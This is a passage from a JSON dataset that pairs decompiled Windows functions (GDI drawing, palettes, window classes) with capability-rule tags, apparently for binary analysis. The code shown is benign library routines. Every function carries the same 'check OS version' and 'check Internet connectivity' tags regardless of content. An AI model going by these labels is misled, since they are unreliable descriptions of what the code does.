&fcn.0041a24c::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00403a90();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x0041a423;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1291
    },
    "0041a5ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0041a5ac(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x463880;\n    if (*0x463884 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x463880;\n        fcn.004028b8();\n        uVar2 = fcn.0041a5a4();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.0041a5a4();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x463884;\n            puVar3 = puVar4 + 0xd;\n            *0x463884 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x463880 = puVar1;\n    puVar3 = *0x463884;\n    puVar1 = *0x463884 + 5;\n    *0x463884 = *(*0x463884 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 369
    },
    "0041a668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a668(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x461400 = *0x463664;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x463664, *0x461414, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x461414, *0x463664);\n        }\n        sub.user32.dll_RegisterClassA(0x4613f0);\n    }\n    uVar2 = fcn.0040699c(0, *0x463664, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.0041a5ac(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 290
    },
    "0041bc60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bc60(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41bc7b;\n    iVar2 = fcn.0041bbd4();\n    puStack24 = 0x41bc85;\n    fcn.0041bc48();\n    uStack28 = 0x41bd34;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.00407bdc();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.004026bc();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.004028b8();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41bd3b;\n    uStack28 = 0x41bd33;\n    fcn.0041bc54();\n    return;\n}\n",
        "token_count": 432
    },
    "0041bd44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bd44(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *var_10h;\n    uchar var_9h;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack24 = 0x41bd68;\n    var_10h = param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0041bc48();\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_10h[1] = var_10h[1] + -1;\n    var_9h = var_10h[1] == 0;\n    if (var_9h) {\n        puVar1 = *(var_4h + 4);\n        if (*(var_4h + 4) == var_8h) {\n            *(var_4h + 4) = *var_8h;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != var_8h);\n            *puVar2 = *var_8h;\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    uStack24 = 0x41bdd2;\n    uStack28 = 0x41bdca;\n    fcn.0041bc54();\n    return;\n}\n",
        "token_count": 390
    },
    "0041bed8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041bed8(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41bee9;\n    fcn.0041bc48();\n    uStack24 = 0x41bf37;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack28 = puVar2[2];\n        if ((iStack28 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack28;\n        }\n        iStack28 = iVar1;\n        iVar1 = iStack28;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack20 = 0x41bf3e;\n    uStack24 = 0x41bf36;\n    iStack28 = iVar1;\n    fcn.0041bc54();\n    return;\n}\n",
        "token_count": 306
    },
    "0041c460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041c460(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "0041ce04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041ce04(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x41ce23;\n        fcn.0041bc48();\n        uStack32 = 0x41ce8a;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x461688);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.0041c430();\n            puStack40 = &fcn.0041ce04::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x41ce91;\n        iStack36 = 0x41ce89;\n        uVar1 = fcn.0041bc54();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 399
    },
    "0041d0f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041d0f0(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x41d113;\n        fcn.0041bc48();\n        uStack28 = 0x41d1bd;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x6c))();\n                var_8h = (**(**(var_4h + 0x18) + 100))();\n            }\n            var_ch = fcn.0041c430();\n            puStack32 = &fcn.0041d0f0::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x41d1c4;\n        uStack28 = 0x41d1bc;\n        uVar2 = fcn.0041bc54();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 564
    },
    "0041d6a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0041d6a0(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x4638c0;\n    puStack20 = 0x41d6b1;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack24 = 0x41d6ec;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.0041d6a0::var_1h + 1;\n        fcn.0041d510();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41d6f3;\n    uStack24 = 0x4638c0;\n    uStack28 = 0x41d6eb;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 267
    },
    "0041dc0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041dc0c(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x41dc28;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x41dc32;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x41dd5a;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.0041dc0c::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x41dc52;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x41dd61);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x41dc75;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x41dc83;\n        fcn.0041db54();\n    }\n    uStack112 = 0x41dcc9;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.0041db54();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x41dcd0);\n    return;\n}\n",
        "token_count": 883
    },
    "0041dda0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041dda0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x462204 == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x41dde8;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x41dded;\n        uStack68 = fcn.0041dbfc();\n        iStack72 = arg_10h;\n        puStack76 = 0x41ddfd;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x41de73;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar2 = fcn.00406954();\n        uVar3 = uVar1;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar3 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x41e027, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar3, arg_ch, arg_8h, \n                           uVar2);\n        sub.gdi32.dll_DeleteObject(uVar3);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x41de86;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x41de8b;\n    uVar3 = fcn.0041dbfc();\n    uStack64 = 0x41e020;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x41dea7;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x41deac;\n    uVar1 = fcn.0041dbfc();\n    uStack84 = uVar1;\n    iVar4 = sub.gdi32.dll_SelectObject(uVar3);\n    iVar5 = sub.gdi32.dll_SelectPalette(hdc, *0x46388c, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar5, 0);\n    if (iVar5 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar3, *0x46388c, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar3, iVar5, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar3);\n    sub.gdi32.dll_StretchBlt(uVar3, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar3, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar4 != 0) {\n        sub.gdi32.dll_SelectObject(uVar3, iVar4);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar3, hpal, 0, 0x41e027);\n    }\n    sub.gdi32.dll_DeleteDC(uVar3);\n    return;\n}\n",
        "token_count": 1139
    },
    "0041e254": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0041e254(void)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x46388c != 0) {\n        uStack20 = 0;\n        puStack24 = 0x41e271;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x41e2da;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.0041e254::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x46388c, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x46388c;\n            sub.gdi32.dll_GetPaletteEntries(*0x46388c, 8, 8, (in_EAX - 0x1c) + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar3 = sub.user32.dll_ReleaseDC(0, uVar1, 0x41e2e1);\n        return uVar3;\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 441
    },
    "0041e2ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041e2ec(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x41e34e;\n        fcn.004028b8();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x41e30a;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x41e313;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x41e327;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x41e333;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.0041e254(),  cVar1 == '\\0')) {\n            fcn.0041e0e4();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 531
    },
    "0041e390": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0041e390(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.0041e0e4();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 122
    },
    "0041e3e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e3e4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x41e412;\n    iVar1 = fcn.0041dd8c();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x41e42a;\n    iVar1 = fcn.0041dd6c();\n    uStack40 = 0;\n    puStack44 = 0x41e433;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x41e441;\n        fcn.0041db00();\n    }\n    uStack48 = 0x41e590;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x41e47a;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x41e47f;\n    uVar2 = fcn.0041dbfc();\n    uStack84 = 0x41e4b6;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.0041dc0c();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x41e4bd;\n    uStack88 = 0x41e4b5;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 587
    },
    "0041e63c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e63c(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x41e662;\n    fcn.00407ab0();\n    uStack136 = 0x41e933;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x41e681;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x41e68f;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x41e69b;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x41e6b7;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x41e6c5;\n        fcn.0041db00();\n    }\n    uStack152 = 0x41e725;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x41e72c);\n    return;\n}\n",
        "token_count": 582
    },
    "0041e95c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
